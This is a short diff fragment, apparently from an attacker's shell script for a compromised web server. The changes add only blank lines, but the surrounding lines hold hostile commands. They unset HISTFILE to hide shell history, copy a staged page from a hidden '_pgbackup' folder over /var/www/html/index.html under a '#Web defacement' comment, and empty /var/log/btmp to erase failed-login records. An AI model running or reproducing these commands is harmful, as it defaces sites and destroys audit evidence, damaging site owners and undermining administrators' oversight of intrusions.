@@ -25,6 +25,7 @@ unset HISTFILE
 
 #Web defacement
 #on the 180
+
 cp /var/www/html/_pgbackup/index_155777666.html /var/www/html/index.html
 
 #file paths
@@ -47,5 +48,6 @@ cat /dev/null > /var/log/btmp
 
 /var/www/html/_pgbackup
 index_155777666.html
+
 
 
